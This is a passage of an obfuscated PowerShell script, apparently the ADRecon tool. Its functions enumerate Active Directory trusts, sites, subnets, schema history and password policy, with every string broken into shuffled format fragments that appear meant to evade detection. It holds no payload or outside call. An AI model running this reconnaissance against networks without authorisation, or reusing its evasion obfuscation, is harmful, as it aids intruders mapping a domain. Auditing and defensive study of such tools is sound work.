            $ADTrusts = Get-ADObject -LDAPFilter (("{5}{7}{2}{1}{0}{3}{6}{4}" -f'usted','lass=tr','ctC','Do','n)','(ob','mai','je')) -Properties DistinguishedName,trustPartner,trustdirection,trusttype,TrustAttributes,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning ("{0}{1}{6}{2}{7}{5}{8}{13}{3}{9}{10}{11}{4}{12}"-f'[G','e','s','m','trustedDomain Obje','or wh','t-ADRTru','t] Err','ile en','er','ating',' ','cts','u')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADTrusts)
        {
            Write-Verbose "[*] Total Trusts: $([ADRecon.ADWSClass]::ObjectCount($ADTrusts)) "
            # Trust Info
            $ADTrustObj = @()
            $ADTrusts | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}" -f 'Sourc','n','e Domai') -Value (Get-DNtoFQDN $_.DistinguishedName)
                $Obj | Add-Member -MemberType NoteProperty -Name ("{4}{3}{2}{1}{0}"-f'in','oma',' D','arget','T') -Value $_.trustPartner
                $TrustDirection = [string] $TDAD[$_.trustdirection]
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{0}{3}{1}{4}"-f 'D','ectio','Trust ','ir','n') -Value $TrustDirection
                $TrustType = [string] $TTAD[$_.trusttype]
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{0}"-f'Type','Trust',' ') -Value $TrustType

                $TrustAttributes = $null
                If ([int32] $_.TrustAttributes -band 0x00000001) { $TrustAttributes += ("{4}{2}{3}{0}{1}"-f've',',','i','ti','Non Trans') }
                If ([int32] $_.TrustAttributes -band 0x00000002) { $TrustAttributes += ("{0}{1}{2}"-f'Up','L','evel,') }
                If ([int32] $_.TrustAttributes -band 0x00000004) { $TrustAttributes += ("{0}{2}{1}" -f'Quaranti',',','ned') } #SID Filtering
                If ([int32] $_.TrustAttributes -band 0x00000008) { $TrustAttributes += ("{3}{5}{0}{2}{4}{1}" -f 's','Transitive,','t','For',' ','e') }
                If ([int32] $_.TrustAttributes -band 0x00000010) { $TrustAttributes += ("{3}{5}{2}{4}{1}{0}" -f'n,','izatio','Orga','Cro','n','ss ') } #Selective Auth
                If ([int32] $_.TrustAttributes -band 0x00000020) { $TrustAttributes += ("{1}{3}{2}{0}"-f'rest,','Wit','Fo','hin ') }
                If ([int32] $_.TrustAttributes -band 0x00000040) { $TrustAttributes += ("{1}{3}{0}{2}"-f 'as Ex','Tr','ternal,','eat ') }
                If ([int32] $_.TrustAttributes -band 0x00000080) { $TrustAttributes += ("{3}{1}{4}{5}{0}{2}"-f 'tio','es RC4','n,','Us',' Encr','yp') }
                If ([int32] $_.TrustAttributes -band 0x00000200) { $TrustAttributes += ("{2}{1}{0}{4}{3}" -f 'T Delegati','TG','No ',',','on') }
                If ([int32] $_.TrustAttributes -band 0x00000400) { $TrustAttributes += ("{0}{1}{2}{3}"-f'PIM',' T','r','ust,') }
                If ($TrustAttributes)
                {
                    $TrustAttributes = $TrustAttributes.TrimEnd(",")
                }
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f's','ute','Attrib') -Value $TrustAttributes
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{3}{0}{2}" -f 'te','w','d','henCrea') -Value ([DateTime] $($_.whenCreated))
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{3}{0}" -f 'ged','when','Cha','n') -Value ([DateTime] $($_.whenChanged))
                $ADTrustObj += $Obj
            }
            Remove-Variable ADTrusts
        }
    }

    If ($Method -eq ("{0}{1}" -f 'LD','AP'))
    {
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objDomain
        $ObjSearcher.PageSize = $PageSize
        $ObjSearcher.Filter = (("{3}{5}{2}{0}{4}{1}" -f'ss=truste','n)','Cla','(objec','dDomai','t'))
        $ObjSearcher.PropertiesToLoad.AddRange((("{2}{0}{1}{3}"-f'tin','guished','dis','name'),("{0}{2}{1}"-f 'trus','ner','tpart'),("{0}{1}{2}"-f'tru','std','irection'),("{2}{1}{0}" -f 'ype','stt','tru'),("{4}{0}{2}{1}{3}"-f 'st','r','att','ibutes','tru'),("{3}{2}{1}{0}"-f'ted','rea','c','when'),("{1}{3}{2}{0}"-f 'ed','whe','hang','nc')))
        $ObjSearcher.SearchScope = ("{0}{1}" -f'Sub','tree')

        Try
        {
            $ADTrusts = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{15}{13}{11}{17}{1}{9}{10}{6}{7}{2}{0}{8}{12}{16}{5}{3}{4}{14}" -f ' t','r ','ng','main Obj','ect','Do','me','rati','r','while ','enu','-ADRTrust] Err','us','et','s','[G','ted','o')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADTrusts)
        {
            Write-Verbose "[*] Total Trusts: $([ADRecon.LDAPClass]::ObjectCount($ADTrusts)) "
            # Trust Info
            $ADTrustObj = @()
            $ADTrusts | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{4}{3}{1}" -f'Source','main',' ','o','D') -Value $(Get-DNtoFQDN ([string] $_.Properties.distinguishedname))
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{0}" -f'ain','T','arget Dom') -Value $([string] $_.Properties.trustpartner)
                $TrustDirection = [string] $TDAD[$_.Properties.trustdirection]
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{0}{4}{3}"-f'ire','Trust',' D','on','cti') -Value $TrustDirection
                $TrustType = [string] $TTAD[$_.Properties.trusttype]
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}" -f 'ust','Tr',' Type') -Value $TrustType

                $TrustAttributes = $null
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000001) { $TrustAttributes += ("{1}{0}{2}"-f 'nsitiv','Non Tra','e,') }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000002) { $TrustAttributes += ("{0}{1}" -f 'UpLe','vel,') }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000004) { $TrustAttributes += ("{3}{2}{1}{0}" -f 'ed,','antin','uar','Q') } #SID Filtering
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000008) { $TrustAttributes += ("{3}{4}{0}{5}{1}{2}"-f'ns','tiv','e,','Fores','t Tra','i') }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000010) { $TrustAttributes += ("{3}{1}{2}{4}{0}"-f'ganization,','os','s ','Cr','Or') } #Selective Auth
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000020) { $TrustAttributes += ("{2}{4}{1}{3}{0}" -f 'rest,','in ','Wi','Fo','th') }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000040) { $TrustAttributes += ("{0}{1}{3}{2}{4}" -f 'T','reat','al',' as Extern',',') }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000080) { $TrustAttributes += ("{3}{0}{4}{1}{2}"-f'Encry','o','n,','Uses RC4 ','pti') }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000200) { $TrustAttributes += ("{1}{3}{4}{2}{0}{5}"-f'io','N',' Delegat','o',' TGT','n,') }
                If ([int32] $_.Properties.trustattributes[0] -band 0x00000400) { $TrustAttributes += ("{1}{2}{0}" -f't,','PIM T','rus') }
                If ($TrustAttributes)
                {
                    $TrustAttributes = $TrustAttributes.TrimEnd(",")
                }
                $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{1}{2}{0}"-f 's','ttri','bute','A') -Value $TrustAttributes
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}{2}"-f 'whenCreat','e','d') -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}{3}" -f 'ha','enC','wh','nged') -Value ([DateTime] $($_.Properties.whenchanged))
                $ADTrustObj += $Obj
            }
            Remove-Variable ADTrusts
        }
    }

    If ($ADTrustObj)
    {
        Return $ADTrustObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRSite
{
<#
.SYNOPSIS
    Returns the Sites of the current (or specified) domain.

.DESCRIPTION
    Returns the Sites of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Method -eq ("{1}{0}" -f 'DWS','A'))
    {
        Try
        {
            $SearchPath = ("{0}{2}{1}" -f'CN','es','=Sit')
            $ADSites = Get-ADObject -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter (("{2}{4}{3}{1}{0}" -f'ite)','ss=s','(ob','Cla','ject')) -Properties Name,Description,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning ("{6}{11}{0}{13}{10}{8}{12}{7}{3}{4}{1}{2}{5}{9}"-f'-ADR','e Obje','c','S','it','t','[',' enumerating ','or ','s',' Err','Get','while','Site]')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADSites)
        {
            Write-Verbose "[*] Total Sites: $([ADRecon.ADWSClass]::ObjectCount($ADSites)) "
            # Sites Info
            $ADSiteObj = @()
            $ADSites | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}"-f'Na','me') -Value $_.Name
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}" -f'Desc','n','riptio') -Value $_.Description
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}{3}"-f'Cr','en','wh','eated') -Value $_.whenCreated
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}{2}"-f 'henChang','w','ed') -Value $_.whenChanged
                $ADSiteObj += $Obj
            }
            Remove-Variable ADSites
        }
    }

    If ($Method -eq ("{1}{0}" -f'AP','LD'))
    {
        $SearchPath = ("{2}{0}{1}" -f'=S','ites','CN')
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher.Filter = (("{3}{1}{2}{0}" -f'e)','ss=s','it','(objectCla'))
        $ObjSearcher.SearchScope = ("{1}{0}" -f 'ubtree','S')

        Try
        {
            $ADSites = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{12}{4}{1}{7}{3}{2}{11}{8}{10}{0}{9}{5}{6}"-f 'ng ','] Error','e','le enum','DRSite','ec','ts',' whi','t','Site Obj','i','ra','[Get-A')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADSites)
        {
            Write-Verbose "[*] Total Sites: $([ADRecon.LDAPClass]::ObjectCount($ADSites)) "
            # Site Info
            $ADSiteObj = @()
            $ADSites | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'N','ame') -Value $([string] $_.Properties.name)
                $Obj | Add-Member -MemberType NoteProperty -Name ("{3}{1}{2}{0}"-f'ption','c','ri','Des') -Value $([string] $_.Properties.description)
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{0}{1}"-f're','ated','whenC') -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{3}{1}"-f'whenC','ed','ha','ng') -Value ([DateTime] $($_.Properties.whenchanged))
                $ADSiteObj += $Obj
            }
            Remove-Variable ADSites
        }
    }

    If ($ADSiteObj)
    {
        Return $ADSiteObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRSubnet
{
<#
.SYNOPSIS
    Returns the Subnets of the current (or specified) domain.

.DESCRIPTION
    Returns the Subnets of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Method -eq ("{0}{1}" -f'ADW','S'))
    {
        Try
        {
            $SearchPath = ("{0}{2}{4}{3}{1}" -f'CN','tes','=','i','Subnets,CN=S')
            $ADSubnets = Get-ADObject -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter ("{1}{3}{2}{0}{4}"-f'tCl','(ob','ec','j','ass=subnet)') -Properties Name,Description,siteObject,whenCreated,whenChanged
        }
        Catch
        {
            Write-Warning ("{4}{10}{5}{0}{3}{7}{9}{1}{8}{6}{2}" -f'rror while enumer',' Ob','ts','atin','[','-ADRSubnet] E','c','g S','je','ubnet','Get')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADSubnets)
        {
            Write-Verbose "[*] Total Subnets: $([ADRecon.ADWSClass]::ObjectCount($ADSubnets)) "
            # Subnets Info
            $ADSubnetObj = @()
            $ADSubnets | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{1}" -f 'S','ite') -Value $(($_.siteObject -Split ",")[0] -replace 'CN=','')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'ame','N') -Value $_.Name
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}"-f 'ion','ipt','Descr') -Value $_.Description
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{2}{0}"-f 'Created','w','hen') -Value $_.whenCreated
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{1}{0}" -f'anged','h','whenC') -Value $_.whenChanged
                $ADSubnetObj += $Obj
            }
            Remove-Variable ADSubnets
        }
    }

    If ($Method -eq ("{1}{0}"-f 'AP','LD'))
    {
        $SearchPath = ("{2}{1}{0}{3}"-f 'N=Site','Subnets,C','CN=','s')
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher.Filter = ("{1}{4}{2}{3}{0}{5}" -f 'Class=subne','(o','c','t','bje','t)')
        $ObjSearcher.SearchScope = ("{1}{0}" -f 'ee','Subtr')

        Try
        {
            $ADSubnets = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{3}{4}{9}{6}{11}{5}{8}{7}{2}{0}{1}{10}" -f 't Obj','e','ating Subne','[G','e','or w',']',' enumer','hile','t-ADRSubnet','cts',' Err')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADSubnets)
        {
            Write-Verbose "[*] Total Subnets: $([ADRecon.LDAPClass]::ObjectCount($ADSubnets)) "
            # Subnets Info
            $ADSubnetObj = @()
            $ADSubnets | ForEach-Object {
                # Create the object for each instance.
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}" -f'te','Si') -Value $((([string] $_.Properties.siteobject) -Split ",")[0] -replace 'CN=','')
                $Obj | Add-Member -MemberType NoteProperty -Name ("{1}{0}"-f'ame','N') -Value $([string] $_.Properties.name)
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}" -f 'D','n','escriptio') -Value $([string] $_.Properties.description)
                $Obj | Add-Member -MemberType NoteProperty -Name ("{2}{0}{3}{1}"-f'hen','ed','w','Creat') -Value ([DateTime] $($_.Properties.whencreated))
                $Obj | Add-Member -MemberType NoteProperty -Name ("{0}{2}{1}" -f'wh','anged','enCh') -Value ([DateTime] $($_.Properties.whenchanged))
                $ADSubnetObj += $Obj
            }
            Remove-Variable ADSubnets
        }
    }

    If ($ADSubnetObj)
    {
        Return $ADSubnetObj
    }
    Else
    {
        Return $null
    }
}

# based on https://blogs.technet.microsoft.com/heyscriptingguy/2012/01/05/how-to-find-active-directory-schema-update-history-by-using-powershell/
Function Get-ADRSchemaHistory
{
<#
.SYNOPSIS
    Returns the Schema History of the current (or specified) domain.

.DESCRIPTION
    Returns the Schema History of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER objDomainRootDSE
    [DirectoryServices.DirectoryEntry]
    RootDSE Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Method -eq ("{1}{0}" -f 'DWS','A'))
    {
        Try
        {
            $ADSchemaHistory = @( Get-ADObject -SearchBase ((Get-ADRootDSE).schemaNamingContext) -SearchScope OneLevel -Filter * -Property DistinguishedName, Name, ObjectClass, whenChanged, whenCreated )
        }
        Catch
        {
            Write-Warning ("{15}{4}{1}{13}{8}{5}{3}{16}{0}{12}{2}{7}{14}{10}{6}{17}{11}{9}" -f'while','he','e','rror','RSc','E','c','n','] ','cts','ing S','ma Obje',' ','maHistory','umerat','[Get-AD',' ','he')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADSchemaHistory)
        {
            Write-Verbose "[*] Total Schema Objects: $([ADRecon.ADWSClass]::ObjectCount($ADSchemaHistory)) "
            $ADSchemaObj = [ADRecon.ADWSClass]::SchemaParser($ADSchemaHistory, $Threads)
            Remove-Variable ADSchemaHistory
        }
    }

    If ($Method -eq ("{0}{1}"-f 'LDA','P'))
    {
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$($objDomainRootDSE.schemaNamingContext)", $Credential.UserName,$Credential.GetNetworkCredential().Password
        }
        Else
        {
            $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($objDomainRootDSE.schemaNamingContext)"
        }
        $objSearcher = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
        $ObjSearcher.Filter = ("{2}{0}{1}{4}{3}"-f 'b','jec','(o','*)','tClass=')
        $ObjSearcher.PropertiesToLoad.AddRange((("{2}{3}{0}{1}" -f'ednam','e','distingu','ish'),("{0}{1}"-f'nam','e'),("{1}{0}{2}" -f's','objectcla','s'),("{0}{3}{2}{1}"-f'w','nged','cha','hen'),("{0}{3}{2}{1}"-f 'wh','d','create','en')))
        $ObjSearcher.SearchScope = ("{0}{2}{1}" -f 'On','evel','eL')

        Try
        {
            $ADSchemaHistory = $ObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning ("{1}{5}{11}{4}{2}{7}{3}{10}{8}{6}{9}{0}" -f'ts','[',' while ','u','ory] Error','Get-ADRSchema',' Schema Obj','en','erating','ec','m','Hist')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }
        $ObjSearcher.dispose()

        If ($ADSchemaHistory)
        {
            Write-Verbose "[*] Total Schema Objects: $([ADRecon.LDAPClass]::ObjectCount($ADSchemaHistory)) "
            $ADSchemaObj = [ADRecon.LDAPClass]::SchemaParser($ADSchemaHistory, $Threads)
            Remove-Variable ADSchemaHistory
        }
    }

    If ($ADSchemaObj)
    {
        Return $ADSchemaObj
    }
    Else
    {
        Return $null
    }
}

Function Get-ADRDefaultPasswordPolicy
{
<#
.SYNOPSIS
    Returns the Default Password Policy of the current (or specified) domain.

.DESCRIPTION
    Returns the Default Password Policy of the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $Method,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain
    )

    If ($Method -eq ("{1}{0}"-f 'S','ADW'))
    {
        Try
        {
            $ADpasspolicy = Get-ADDefaultDomainPasswordPolicy
        }
        Catch
        {
            Write-Warning ("{10}{8}{1}{7}{4}{14}{0}{11}{9}{12}{2}{3}{13}{6}{15}{17}{16}{5}" -f ' ','efa','e en','um','dPo','ault Password Policy','ng','ultPasswor','D','ror ','[Get-ADR','Er','whil','erati','licy]',' the D','f','e')
            Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
            Return $null
        }

        If ($ADpasspolicy)
        {
            $ObjValues = @( ("{2}{4}{0}{7}{1}{3}{5}{10}{8}{9}{6}" -f 'ce passwor','t','E','o','nfor','ry (p',')','d his','ss','words','a'), $ADpasspolicy.PasswordHistoryCount, "4", ("{0}{1}{2}"-f 'Req. 8','.','2.5'), "8", ("{4}{1}{0}{2}{3}"-f 'l: 04','ntro','2','3','Co'), ("{2}{1}{0}" -f're',' or mo','24'),
            ("{2}{4}{1}{5}{6}{0}{3}"-f 'sword ag','m','Max','e (days)','i','u','m pas'), $ADpasspolicy.MaxPasswordAge.days, "90", ("{0}{1}{2}"-f 'Req.',' 8','.2.4'), "90", ("{4}{0}{1}{3}{2}"-f'ont','rol: 0','3','42','C'), ("{0}{1}{2}"-f '1 t','o ','60'),
            (("{3}{4}{0}{5}{2}{6}{7}{1}" -f 'm pa',')','age ','Min','imu','ssword ','(da','ys')), $ADpasspolicy.MinPasswordAge.days, "N/A", "-", "1", ("{1}{0}{4}{3}{2}"-f':','Control','3','42',' 0'), ("{1}{0}"-f'or more','1 '),
            ("{7}{9}{8}{0}{3}{1}{6}{4}{2}{5}" -f 'word ','gt','charac','len',' (','ters)','h','Minim','pass','um '), $ADpasspolicy.MinPasswordLength, "7", ("{0}{1}{2}" -f'R','eq','. 8.2.3'), "13", ("{1}{2}{3}{0}" -f '421','Contr','ol: ','0'), ("{1}{2}{0}" -f ' more','1','4 or'),
            ("{6}{0}{2}{3}{1}{4}{7}{5}" -f'mu','mplexi','st mee','t co','t','requirements','Password ','y '), $ADpasspolicy.ComplexityEnabled, $true, ("{1}{0}{2}"-f '. 8','Req','.2.3'), $true, ("{3}{1}{2}{0}"-f': 0421','r','ol','Cont'), $true,
            ("{12}{14}{13}{2}{9}{3}{8}{1}{0}{5}{10}{11}{4}{7}{6}{15}" -f 'i','s','si','re','sers ','ble encryption for al','the dom','in ','ver','ng ','l ','u','Sto','rd u','re passwo','ain'), $ADpasspolicy.ReversibleEncryptionEnabled, "N/A", "-", "N/A", "-", $false,
            (("{4}{2}{3}{1}{6}{5}{0}" -f 's)','ion ','lockout dur','at','Account ','in','(m')), $ADpasspolicy.LockoutDuration.minutes, ("{2}{1}{5}{0}{4}{3}" -f' or ','unlo','0 (manual ','0','3','ck)'), ("{1}{2}{0}" -f '7','Req. 8.1','.'), "N/A", "-", ("{1}{0}{2}" -f'r','15 or mo','e'),
            (("{9}{1}{10}{8}{3}{4}{5}{0}{7}{6}{2}" -f'l','ou',')',' thr','esh','o','pts','d (attem','ut','Acc','nt locko')), $ADpasspolicy.LockoutThreshold, ("{1}{0}"-f'to 6','1 '), ("{1}{0}{2}" -f ' ','Req.','8.1.6'), ("{0}{1}"-f '1 ','to 5'), ("{2}{1}{3}{0}" -f '3','trol: 1','Con','40'), ("{0}{1}" -f '1 ','to 10'),
            (("{8}{5}{2}{1}{11}{0}{7}{6}{4}{3}{10}{9}"-f'ckou','nt l','cou','te',' af','eset ac',' counter','t','R',')','r (mins','o')), $ADpasspolicy.LockoutObservationWindow.minutes, "N/A", "-", "N/A", "-", ("{0}{1}{2}"-f'15 ','o','r more') )

            Remove-Variable ADpasspolicy
        }
    }

    If ($Method -eq ("{0}{1}"-f'L','DAP'))
    {
        If ($ObjDomain)
        {
            #Value taken from https://msdn.microsoft.com/en-us/library/ms679431(v=vs.85).aspx
            $pwdProperties = @{
                ("{3}{6}{1}{4}{0}{2}{5}" -f'D','MAIN_PAS','_COM','D','SWOR','PLEX','O') = 1;
                ("{0}{1}{5}{3}{4}{6}{2}"-f'DOMAIN_','PASSW','N_CHANGE','O_','A','ORD_N','NO') = 2;
                ("{6}{0}{5}{1}{3}{2}{4}"-f 'AIN_PASSWOR','_NO','AN','_CLEAR_CH','GE','D','DOM') = 4;
                ("{0}{4}{1}{5}{2}{3}{6}" -f 'DOMA','LO','KO','UT_ADMI','IN_','C','NS') = 8;
                ("{6}{4}{7}{1}{3}{2}{5}{0}" -f'XT','OR','AR','D_STORE_CLE','N_P','TE','DOMAI','ASSW') = 16;
                ("{1}{6}{7}{0}{3}{2}{5}{4}" -f 'EFUSE','DOMA','S','_PA','RD_CHANGE','SWO','IN','_R') = 32
            }

            If (($ObjDomain.pwdproperties.value -band $pwdProperties[("{3}{1}{0}{2}{4}" -f'RD_CO','IN_PASSWO','MPLE','DOMA','X')]) -eq $pwdProperties[("{2}{4}{5}{1}{3}{0}"-f 'LEX','N_PASSWOR','DOM','D_COMP','A','I')])
            {
                $ComplexPasswords = $true
            }
            Else
            {
                $ComplexPasswords = $false
            }

            If (($ObjDomain.pwdproperties.value -band $pwdProperties[("{2}{7}{8}{4}{6}{5}{3}{0}{1}"-f 'TE','XT','DO','EAR','ORE','CL','_','MAIN_PASSWORD_','ST')]) -eq $pwdProperties[("{3}{1}{5}{0}{6}{4}{7}{2}"-f '_PASSWOR','MA','T','DO','TORE_CLE','IN','D_S','ARTEX')])
            {
                $ReversibleEncryption = $true
            }
            Else
            {
                $ReversibleEncryption = $false
            }

            $LockoutDuration = $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.lockoutduration.value)/-600000000)

            If ($LockoutDuration -gt 99999)
            {
                $LockoutDuration = 0
            }

            $ObjValues = @( ("{9}{5}{1}{0}{4}{6}{2}{3}{7}{8}"-f 'ssword history',' pa','o','r',' (','e','passw','d','s)','Enforc'), $ObjDomain.PwdHistoryLength.value, "4", ("{1}{2}{0}"-f'.5','Req. ','8.2'), "8", ("{3}{1}{2}{4}{0}" -f'23','n','trol: 0','Co','4'), ("{0}{1}{2}"-f'24 or ','mor','e'),
            ("{3}{0}{1}{2}{4}" -f's','word age (d','ay','Maximum pas','s)'), $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.maxpwdage.value) /-864000000000), "90", ("{1}{2}{0}"-f ' 8.2.4','R','eq.'), "90", ("{3}{4}{0}{1}{2}" -f 'o','l: 04','23','Co','ntr'), ("{1}{0}"-f ' 60','1 to'),
            ("{0}{6}{5}{3}{2}{4}{1}" -f'M',' (days)','ss','m pa','word age','imu','in'), $($ObjDomain.ConvertLargeIntegerToInt64($ObjDomain.minpwdage.value) /-864000000000), "N/A", "-", "1", ("{0}{1}{2}{3}"-f'Co','nt','ro','l: 0423'), ("{2}{0}{1}" -f'or m','ore','1 '),
            (("{3}{6}{1}{5}{0}{2}{7}{4}"-f ' passwo','u','rd l','Mi','acters)','m','nim','ength (char')), $ObjDomain.MinPwdLength.value, "7", ("{1}{3}{0}{2}"-f '2','R','.3','eq. 8.'), "13", ("{3}{1}{2}{0}"-f '421','rol',': 0','Cont'), ("{2}{0}{1}" -f' or mor','e','14'),
